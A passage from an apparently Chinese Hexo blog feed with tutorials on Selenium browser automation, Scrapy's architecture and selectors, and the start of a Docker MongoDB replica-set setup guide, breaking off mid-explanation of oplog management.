class="line">send_keys(*keys_to_send) ——发送某个键到当前焦点的元素 </span><br><span class="line">send_keys_to_element(element, *keys_to_send) ——发送某个键到指定元素</span><br></pre></td></tr></table></figure></p><p>执行JavaScript(某些动作比较难实现的时候，可以用Javascript实现):<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">browser = webdriver.Chrome()</span><br><span class="line">browser.get(<span class="string">'https://www.zhihu.com/explore'</span>)</span><br><span class="line">browser.execute_script(<span class="string">'windows.scrollTo(0,document.body.scrollHeight)'</span>)</span><br><span class="line">browser.execute_script(<span class="string">'alert('</span>To bottom<span class="string">')'</span>)</span><br></pre></td></tr></table></figure></p><h3 id="获取属性、文本值、ID、位置、大小等："><a href="#获取属性、文本值、ID、位置、大小等：" class="headerlink" title="获取属性、文本值、ID、位置、大小等："></a>获取属性、文本值、ID、位置、大小等：</h3><p>获取属性：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">logo = browser.find_element_by_id(<span class="string">'zh-top-link-logo'</span>)</span><br><span class="line">print(logo)</span><br><span class="line">print(logo.get_attrbute(<span class="string">'class'</span>))</span><br></pre></td></tr></table></figure></p><p>获取文本值：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(logo.text)</span><br></pre></td></tr></table></figure></p><p>获取ID、位置、标签名、大小：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">print(logo.id)</span><br><span class="line">print(logo.location)</span><br><span class="line">print(logo.tag_name)</span><br><span class="line">print(logo.size)</span><br></pre></td></tr></table></figure></p><h3 id="Frame"><a href="#Frame" class="headerlink" title="Frame"></a>Frame</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium.common.exceptions <span class="keyword">import</span> NoSuchElementException</span><br><span class="line"></span><br><span class="line">browser.switch_to.frame(<span class="string">'iframeResult'</span>)</span><br></pre></td></tr></table></figure><h3 id="等待"><a href="#等待" class="headerlink" title="等待"></a>等待</h3><p>隐式测试</p><p>当使用了隐式等待执行测试的时候，如果WebDriver没有在DOM中找到元素,将继续等待，超出时间后则抛出异常。换句话说，当查找元素或元素并没有立即出现的时候，隐式等待将等待一段时间再查找DOM的默认时间是0<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">browser = webdriver.Chrome()</span><br><span class="line">browser.implicitly_wait(<span class="number">10</span>)</span><br><span class="line">browser.get(<span class="string">'https://www.zhihu.com/explore'</span>)</span><br><span class="line">inputs = browser.find_element_by_class_name(<span class="string">'zu-top-add-question'</span>) <span class="comment"># 如果没找到，则等待，10秒内还没找到，就抛出异常</span></span><br><span class="line">print(inputs)</span><br></pre></td></tr></table></figure></p><p>显示等待:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium.wendriver.common.by <span class="keyword">import</span> By</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support.ui <span class="keyword">import</span> WebDriverWait</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.support <span class="keyword">import</span> expected_conditions <span class="keyword">as</span> EC</span><br><span class="line"></span><br><span class="line">browser.get(<span class="string">'https://www.taobao.com'</span>)</span><br><span class="line">wait = WebDriverWait(browser,<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">inputs = wai.until(EC.presence_of_element_locate(By.ID,<span class="string">'q'</span>))</span><br><span class="line">button = wait.until(EC.element_to_be_clickable(By.CSS_SELECTOR,<span class="string">'.btn-search'</span>))</span><br><span class="line">print(inputs,button)</span><br></pre></td></tr></table></figure></p><p>显示等待的一些条件:</p><ul><li>title_is 标题是某内容</li><li>title_contains 标题包含某内容</li><li>presence_of_element_located 元素加载出，传入定位元组，如(By.ID,’q’)</li><li>visibility_of_element_located 元素可见，传入定位元组</li><li>visiblity_of 可见,传入元素对象</li><li>presence_of_all_elements_located 所有元素加载出</li><li>text_to_be_present_in_element 某个元素文本包含某文字<br>…还有很多，可参看文档</li></ul><h3 id="ccookies"><a href="#ccookies" class="headerlink" title="ccookies"></a>ccookies</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">browser.get_cookies()</span><br><span class="line">browser.add_cookies(&#123;<span class="string">'xxx'</span>:<span class="string">'xxx'</span>,<span class="string">'xxx'</span>:<span class="string">'xxx'</span>&#125;)</span><br></pre></td></tr></table></figure><h3 id="选项卡管理-打开窗口、切换窗口"><a href="#选项卡管理-打开窗口、切换窗口" class="headerlink" title="选项卡管理(打开窗口、切换窗口)"></a>选项卡管理(打开窗口、切换窗口)</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">browser.execute_script(<span class="string">'windows.open()'</span>)</span><br><span class="line">print(browser.windows_handles)</span><br><span class="line">browser.switch_to_window(browser.windows_hangles[<span class="number">1</span>])</span><br></pre></td></tr></table></figure><h3 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium.common.exceptions <span class="keyword">import</span> TimeoutException,NoSuchElementException</span><br></pre></td></tr></table></figure><h3 id="无界面"><a href="#无界面" class="headerlink" title="无界面:"></a>无界面:</h3><p>需要chrome需要60版本以上</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line"><span class="keyword">from</span> selenium.webdriver.chrome.options <span class="keyword">import</span> Options</span><br><span class="line"></span><br><span class="line">options=Options()</span><br><span class="line">options.add_argument(<span class="string">'--headless'</span>)</span><br><span class="line">options.add_argument(<span class="string">'--disable-gpu'</span>)</span><br><span class="line"></span><br><span class="line">web=webdriver.Chrome(chrome_options=options)</span><br><span class="line">web.get(<span class="string">'[http://www.kandianbao.com/'</span>](http://www.kandianbao.com/<span class="string">');)</span></span><br><span class="line"><span class="string">print(web.page_source)</span></span><br><span class="line"><span class="string">web.quit()</span></span><br></pre></td></tr></table></figure><h3 id="selenium动态定位id、class"><a href="#selenium动态定位id、class" class="headerlink" title="selenium动态定位id、class"></a>selenium动态定位id、class</h3><ol><li>根据其他属性定位<br>如果有其他固定属性，最先考虑的当然是根据元素的其他属性来定位，定位方式那么多，何必在这一棵树上吊死。。</li><li>根据相对关系定位<br>根据其附近的父节点、子节点、兄弟节点定位，关于这方面，可参考：<a href="https://huilansame.github.io/huilansame.github.io/archivers/father-brother-locate" target="_blank" rel="noopener">Python selenium —— 父子、兄弟、相邻节点定位方式详解</a></li><li>根据DOM顺序index定位<br>这个很简单，找到该元素在主文档或某级父节点中的index，然后根据index可轻松定位，不过这种方式可能不够稳定，如果可以，还是用其他的方法定位更加合适。</li><li><p>根据部分元素属性定位<br>xpath中提供了三个非常好的方法来为我们定位部分属性值：</p> <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">driver.find_element_by_xpath(<span class="string">"//div[contains(@id, 'btn-attention')]"</span>)</span><br><span class="line">driver.find_element_by_xpath(<span class="string">"//div[starts-with(@id, 'btn-attention')]"</span>)</span><br><span class="line">driver.find_element_by_xpath(<span class="string">"//div[ends-with(@id, 'btn-attention')]"</span>) <span class="comment"># 这个需要结尾是'btn-attention'</span></span><br><span class="line">contains(a, b)  如果a中含有字符串b，则返回true，否则返回false</span><br><span class="line">starts-<span class="keyword">with</span>(a, b)  如果a是以字符串b开头，返回true，否则返回false</span><br><span class="line">ends-<span class="keyword">with</span>(a, b)  如果a是以字符串b结尾，返回true，否则返回false</span><br></pre></td></tr></table></figure><p> 这里要多嘴一句，各种浏览器对xpath的支持情况不一样，像IE就差点，所以有时候会出现xpath在一个浏览器能定位到但在另一个浏览器定位不到的问题，不要惊讶。。</p><p> 附上一个此类型问题：</p><p> <a href="http://stackoverflow.com/questions/22436789/xpath-ends-with-does-not-work" target="_blank" rel="noopener">Xpath “ends-with” does not work</a></p></li></ol><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><a href="http://selenium-python-zh.readthedocs.io/en/latest/" target="_blank" rel="noopener">python selenium中文文档</a></li><li><a href="http://selenium-python.readthedocs.io/" target="_blank" rel="noopener">python selenium英文文档</a></li></ul>]]></content>
      
      <categories>
          
          <category> 爬虫 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> selenium </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>scrapy架构简介与基本操作</title>
      <link href="/scrapy%E6%9E%B6%E6%9E%84%E7%AE%80%E4%BB%8B%E4%B8%8E%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C.html"/>
      <content type="html"><![CDATA[<blockquote class="blockquote-center">不求与人相比，但求超越自己，要哭就哭出激动的泪水，要笑就笑出成长的性格！</blockquote><p><img src="http://p5m1dtoh7.bkt.clouddn.com/scrapy%E5%9F%BA%E7%A1%80%E7%AE%80%E4%BB%8B%E4%B8%8E%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/scrapy%E6%9E%B6%E6%9E%84.png" alt=""></p><a id="more"></a><h2 id="scrapy处理的大致流程"><a href="#scrapy处理的大致流程" class="headerlink" title="scrapy处理的大致流程"></a>scrapy处理的大致流程</h2><blockquote><p>Scrapy是一个为了爬取网站数据，提取结构性数据而编写的应用框架。 可以应用在包括数据挖掘，信息处理或存储历史数据等一系列的程序中。</p><p>其最初是为了页面抓取 (更确切来说, 网络抓取 )所设计的， 也可以应用在获取API所返回的数据(例如 Amazon Associates Web Services ) 或者通用的网络爬虫。Scrapy用途广泛，可以用于数据挖掘、监测和自动化测试</p></blockquote><p><img src="http://p5m1dtoh7.bkt.clouddn.com/scrapy%E5%9F%BA%E7%A1%80%E7%AE%80%E4%BB%8B%E4%B8%8E%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/scrapy%E6%9E%B6%E6%9E%84.png" alt=""></p><p>Scrapy主要包括了以下组件：</p><ul><li>引擎(Scrapy): 用来处理整个系统的数据流处理, 触发事务(框架核心)</li><li>调度器(Scheduler): 用来接受引擎发过来的请求, 压入队列中, 并在引擎再次请求的时候返回. 可以想像成一个URL（抓取网页的网址或者说是链接）的优先队列, 由它来决定下一个要抓取的网址是什么, 同时去除重复的网址</li><li>下载器(Downloader): 用于下载网页内容, 并将网页内容返回给蜘蛛(Scrapy下载器是建立在twisted这个高效的异步模型上的)</li><li>爬虫(Spiders): 爬虫是主要干活的, 用于从特定的网页中提取自己需要的信息, 即所谓的实体(Item)。用户也可以从中提取出链接,让Scrapy继续抓取下一个页面</li><li>项目管道(Pipeline): 负责处理爬虫从网页中抽取的实体，主要的功能是持久化实体、验证实体的有效性、清除不需要的信息。当页面被爬虫解析后，将被发送到项目管道，并经过几个特定的次序处理数据。</li><li>下载器中间件(Downloader Middlewares): 位于Scrapy引擎和下载器之间的框架，主要是处理Scrapy引擎与下载器之间的请求及响应。</li><li>爬虫中间件(Spider Middlewares): 介于Scrapy引擎和爬虫之间的框架，主要工作是处理蜘蛛的响应输入和请求输出。</li><li>调度中间件(Scheduler Middewares): 介于Scrapy引擎和调度之间的中间件，从Scrapy引擎发送到调度的请求和响应。</li></ul><p>Scrapy运行流程大概如下：</p><ul><li>首先，引擎从调度器中取出一个链接(URL)用于接下来的抓取</li><li>引擎把URL封装成一个请求(Request)传给下载器，下载器把资源下载下来，并封装成应答包(Response)</li><li>然后，爬虫解析Response</li><li>若是解析出实体（Item）,则交给实体管道进行进一步的处理。</li><li>若是解析出的是链接（URL）,则把URL交给Scheduler等待抓取</li></ul><h2 id="如何使用"><a href="#如何使用" class="headerlink" title="如何使用?"></a>如何使用?</h2><p>运行scrapy startproject tutorial(名称自己定)<br>运行scrapy genspider example example.com<br>可以看到生成了如下目录结构:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">├── tutorial</span><br><span class="line">├── scrapy.cfg</span><br><span class="line">└── tutorial</span><br><span class="line">├── __init__.py</span><br><span class="line">├── middlewares.py</span><br><span class="line">├── items.py</span><br><span class="line">├── pipelines.py</span><br><span class="line">├── settings.py</span><br><span class="line">└── spiders</span><br><span class="line">└── example.py</span><br><span class="line">└── __init__.py</span><br></pre></td></tr></table></figure></p><p>目录解析:</p><ul><li>items.py用来保存数据的结构</li><li>middlewares.py爬取过程中用来处理request,response,exception的操作</li><li>pipelines.py项目管道,用来处理item数据</li><li>settings.py配置信息</li><li>主要代码在spiders下的example.py编写解析规则</li></ul><h2 id="scrapy的选择器示例"><a href="#scrapy的选择器示例" class="headerlink" title="scrapy的选择器示例"></a>scrapy的选择器示例</h2><p>Example：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">base</span> <span class="attr">href</span>=<span class="string">'[http://example.com/'</span>](<span class="attr">http:</span>//<span class="attr">example.com</span>/'); /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>Example website<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">'images'</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">'image1.html'</span>&gt;</span>Name: My image 1 <span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">'image1_thumb.jpg'</span> /&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">'image2.html'</span>&gt;</span>Name: My image 2 <span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">'image2_thumb.jpg'</span> /&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">'image3.html'</span>&gt;</span>Name: My image 3 <span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">'image3_thumb.jpg'</span> /&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">'image4.html'</span>&gt;</span>Name: My image 4 <span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">'image4_thumb.jpg'</span> /&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">'image5.html'</span>&gt;</span>Name: My image 5 <span class="tag">&lt;<span class="name">br</span> /&gt;</span><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">'image5_thumb.jpg'</span> /&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>两种选择方式:</p><ul><li>response.xpath() </li><li>response.css()<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">response.xpath(<span class="string">'//title/text()'</span>).extract_first()</span><br><span class="line">response.css(<span class="string">'title::text'</span>).extract_first()</span><br><span class="line">response.xpath('//div[@id="not-exists"]/text()').extract_first() is None==&gt; True</span><br><span class="line">response.xpath('//div[@id="not-exists"]/text()').extract_first(default='not fount')==&gt; not found</span><br><span class="line">response.xpath(<span class="string">'//base/@href'</span>).extract()</span><br><span class="line">response.css(<span class="string">'base::attr(href)'</span>).extract()</span><br><span class="line">response.xpath(<span class="string">'//a[contains(@href,"image")]/@href'</span>).extract()</span><br><span class="line">response.css(<span class="string">'a[href*=image]::attr(href)'</span>).extract()</span><br></pre></td></tr></table></figure></li></ul><p>选择附近的元素：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">links = response.xpath(<span class="string">'//a[contains(@href, "image")]'</span>)</span><br><span class="line"><span class="keyword">for</span> index,link <span class="keyword">in</span> enumerate(links):</span><br><span class="line">args = (index, link.xpath(<span class="string">'@href'</span>).extract(),link.xpath(<span class="string">'img/@src'</span>).extract())</span><br><span class="line"><span class="keyword">print</span> <span class="string">'Link number %d points to url %s and image %s'</span> % args</span><br></pre></td></tr></table></figure></p><p><strong><em>注：使用xpath时如果要在当前元素下继续选择元素需要使用.//而不是//。。因为//会从整个文档解  析</em></strong></p><p>使用正则:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">response.xpath(<span class="string">'//a[contains(@href, "image")]/text()'</span>).re(<span class="string">r'Name:\s*(.*)'</span>)</span><br><span class="line">response.xpath(<span class="string">'//a[contains(@href, "image")]/text()'</span>).re_first(<span class="string">r'Name:\s*(.*)'</span>)</span><br></pre></td></tr></table></figure></p><p>EXSLT 扩展的使用:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># re（test()函数）:</span></span><br><span class="line"><span class="keyword">from</span> scrapy <span class="keyword">import</span> Selector</span><br><span class="line"></span><br><span class="line">doc = <span class="string">"""&lt;div&gt;</span></span><br><span class="line"><span class="string">&lt;ul&gt;</span></span><br><span class="line"><span class="string">&lt;li class="item-0"&gt;&lt;a href="link1.html"&gt;first item&lt;/a&gt;&lt;/li&gt;&lt;li class="item-1"&gt;&lt;a href="link2.html"&gt;second item&lt;/a&gt;&lt;/li&gt;&lt;li class="item-inactive"&gt;&lt;a href="link3.html"&gt;third item&lt;/a&gt;  &lt;/li&gt;</span></span><br><span class="line"><span class="string">&lt;li class="item-1"&gt;&lt;a href="link4.html"&gt;fourth item&lt;/a&gt;&lt;/li&gt;&lt;li class="item-0"&gt;&lt;a href="link5.html"&gt;fifth item&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;</span></span><br><span class="line"><span class="string">&lt;/div&gt;</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">sel = Selector(text=doc, type=<span class="string">"html"</span>)</span><br><span class="line">sel.xpath(<span class="string">'//li//@href'</span>).extract()</span><br><span class="line">sel.xpath(<span class="string">'//li[re:test(@class, "item-\d$")]//@href'</span>).extract()</span><br></pre></td></tr></table></figure></p><p>当需要使用元素的text内容作为一个参数传给一个xpath的string function(比如contains、start_with)时,避免使用.//text()，应该使用.代替。这是因为表达式// text（）产生了一组文本元素 - 一个节点集合。当一个节点集合被转换成一个字符串，当它被作为参数传递给一个像contains（）或starts-with（）这样的字符串函数时，就会产生第一个元素的文本。:<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scrapy <span class="keyword">import</span> Selector</span><br><span class="line"></span><br><span class="line">sel = Selector(text=<span class="string">'&lt;a href="#"&gt;Click here to go to the &lt;strong&gt;Next Page&lt;/strong&gt;&lt;/  a&gt;'</span>)</span><br><span class="line"></span><br><span class="line">sel.xpath('//a//text()').extract()==&gt; # take a peek at the node-set[u'Click here to g  o to the ', u'Next Page']</span><br><span class="line"></span><br><span class="line">sel.xpath("string(//a[1]//text())").extract()==&gt; # convert it to string[u'Clic  k here to go to the ']</span><br><span class="line"></span><br><span class="line">sel.xpath("//a[contains(.//text(), 'Next Page')]").extract()==&gt;[]</span><br><span class="line"></span><br><span class="line">sel.xpath("//a[contains(., 'Next Page')]").extract()==&gt;[u'&lt;a href="#"&gt;Click here to g  o to the &lt;strong&gt;Next Page&lt;/strong&gt;&lt;/a&gt;']</span><br></pre></td></tr></table></figure></p><p>当使用clss属性查询时，且class有多个属性时，考虑使用css而不是xpath，因为如果你使用@ class=’someclass’，你最终可能会丢失具有其他类的元素，如果你只是使用contains（@class，’someclass’）来弥补，你可能会得到更多的元素，如果他们有一个不同的类名称共享字符串someclass。 事实证明，Scrapy选择器允许你链接选择器，所以大多数情况下，你可以通过CSS来选择类，然后在需要时切换到XPath：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scrapy <span class="keyword">import</span> Selector</span><br><span class="line"></span><br><span class="line">sel = Selector(text=<span class="string">'&lt;div class="hero shout"&gt;&lt;time datetime="2014-07-23 19:00"&gt;Specia  l date&lt;/time&gt;&lt;/div&gt;'</span>)</span><br><span class="line"></span><br><span class="line">sel.css(<span class="string">'.shout'</span>).xpath(<span class="string">'./time/@datetime'</span>).extract()</span><br></pre></td></tr></table></figure></p>]]></content>
      
      <categories>
          
          <category> 爬虫 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> scrapy </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>使用docker搭建mongodb副本集</title>
      <link href="/%E4%BD%BF%E7%94%A8docker%E6%90%AD%E5%BB%BAmongodb%E5%89%AF%E6%9C%AC%E9%9B%86.html"/>
      <content type="html"><![CDATA[<blockquote class="blockquote-center">当你觉得很累的时候，说明你正在走上坡路。</blockquote><p><img src="https://docs.mongodb.com/manual/_images/replica-set-read-write-operations-primary.bakedsvg.svg" alt=""></p><a id="more"></a><h2 id="使用docker搭建mongodb副本集"><a href="#使用docker搭建mongodb副本集" class="headerlink" title="使用docker搭建mongodb副本集"></a>使用docker搭建mongodb副本集</h2><h3 id="我所使用的环境"><a href="#我所使用的环境" class="headerlink" title="我所使用的环境"></a>我所使用的环境</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker version: 17.10.0-ce, build f4ffd25</span><br><span class="line">docker-compose: version 1.16.1, build 6d1ac219</span><br><span class="line">mongo version: 3.6</span><br></pre></td></tr></table></figure><h3 id="基本思路与副本集工作流程"><a href="#基本思路与副本集工作流程" class="headerlink" title="基本思路与副本集工作流程"></a>基本思路与副本集工作流程</h3><h4 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h4><p><img src="https://docs.mongodb.com/manual/_images/replica-set-read-write-operations-primary.bakedsvg.svg" alt=""></p><p>图片解析<a href="http://wiki.jikexueyuan.com/project/mongodb/mongodb-replication.html" target="_blank" rel="noopener">看这里</a></p><h4 id="副本集工作流程"><a href="#副本集工作流程" class="headerlink" title="副本集工作流程"></a>副本集工作流程</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'在 MongoDB 副本集中,主节点负责处理客户端的读写请求,备份节点则负责映射主节点的 数据。备份节点的工作原理过程可以大致描述为,备份节点定期轮询主节点上的数据操作,</span></span><br><span class="line"><span class="string">然后对 自己的数据副本进行这些操作,从而保证跟主节点的数据同步。至于主节点上的所有 数据库状态改变 的操作,都会存放在一张特定的系统表中。备份节点则是根据这些数据进</span></span><br><span class="line"><span class="string">行自己的数据更新。</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">oplog</span></span><br><span class="line"><span class="string">上面提到的数据库状态改变的操作,称为 oplog(operation log,主节点操作记录)。oplog 存储在 local 数据库的"oplog.rs"表中。副本集中备份节点异步的从主节点同步 oplog,然后重新 执行它记录的操作,以此达到了数据同步的作用。</span></span><br><span class="line"><span class="string">关于 oplog 有几个注意的地方:</span></span><br><span class="line"><span class="string">1）oplog 只记录改变数据库状态的操作</span></span><br><span class="line"><span class="string">2）存储在 oplog 中的操作并不是和主节点执行的操作完全一样,例如"$inc"操作就会转化为"$set"操作</span></span><br><span class="line"><span class="string">3）oplog 存储在固定集合中(capped collection),当 oplog 的数量超过 oplogSize,新的操作就会覆盖就的操作</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">数据同步</span></span><br><span class="line"><span class="string">在副本集中,有两种数据同步方式:</span></span><br><span class="line"><span class="string">1）initial sync(初始化):这个过程发生在当副本集中创建一个新的数据库或其中某个节点刚从宕机中恢复,或者向副本集中添加新的成员的时候,默认的,副本集中的节点会从离 它最近</span></span><br><span class="line"><span class="string">   的节点复制 oplog 来同步数据,这个最近的节点可以是 primary 也可以是拥有最新 oplog 副本的 secondary 节点。该操作一般会重新初始化备份节点,开销较大。</span></span><br><span class="line"><span class="string">2）replication(复制):在初始化后这个操作会一直持续的进行着,以保持各个 secondary 节点之间的数据同步。</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">initial sync</span></span><br><span class="line"><span class="string">当遇到无法同步的问题时,只能使用以下两种方式进行 initial sync 了</span></span><br><span class="line"><span class="string">1）第一种方式就是停止该节点,然后删除目录中的文件,重新启动该节点。这样,这个节 点就会执行 initial sync</span></span><br><span class="line"><span class="string">   注意:通过这种方式,sync 的时间是根据数据量大小的,如果数据量过大,sync 时间就 会很长</span></span><br><span class="line"><span class="string">   同时会有很多网络传输,可能会影响其他节点的工作</span></span><br><span class="line"><span class="string">2）第二种方式,停止该节点,然后删除目录中的文件,找一个比较新的节点,然后把该节点目 录中的文件拷贝到要 sync 的节点目录中</span></span><br><span class="line"><span class="string">通过上面两种方式中的一种,都可以重新恢复"port=33333"的节点。不在进行截图了。</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string">副本集管理</span></span><br><span class="line"><span class="string">1）查看oplog的信息 通过"db.printReplicationInfo()"命令可以查看 oplog 的信息</span></span><br><span class="line"><span class="string">   字段说明:</span></span><br><span class="line"><span class="string">   configured oplog size: oplog 文件大小</span></span><br><span class="line"><span class="string">   log length start to end:     oplog 